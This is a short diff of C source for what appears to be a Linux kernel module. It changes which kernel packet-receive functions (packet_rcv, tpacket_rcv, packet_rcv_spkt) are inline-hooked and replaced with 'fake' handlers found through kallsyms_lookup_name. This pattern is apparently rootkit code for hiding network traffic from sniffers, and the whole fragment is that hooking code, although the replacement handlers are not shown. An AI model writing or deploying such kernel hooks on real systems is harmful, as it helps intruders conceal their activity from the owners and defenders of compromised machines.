@@ -1533,20 +1533,21 @@ int init(void)
 	mutex_init(&lock_tpacket_rcv);
 	mutex_init(&lock_packet_rcv_spkt);
 	
+	/*
 	inc_critical(&lock_packet_rcv, &accesses_packet_rcv);
 	asm_hook_create((void *)kallsyms_lookup_name("packet_rcv"), fake_packet_rcv);
 	dec_critical(&lock_packet_rcv, &accesses_packet_rcv);
-	
-	/*
+	*/
+
 	inc_critical(&lock_tpacket_rcv, &accesses_tpacket_rcv);
 	asm_hook_create((void *)kallsyms_lookup_name("tpacket_rcv"), fake_tpacket_rcv);
 	dec_critical(&lock_tpacket_rcv, &accesses_tpacket_rcv);
 	
+	/*
 	inc_critical(&lock_packet_rcv_spkt, &accesses_packet_rcv_spkt);
 	asm_hook_create((void *)kallsyms_lookup_name("packet_rcv_spkt"), fake_packet_rcv_spkt);
 	dec_critical(&lock_packet_rcv_spkt, &accesses_packet_rcv_spkt);
 	*/
-	
 	
 	
 /* -----------------------*/
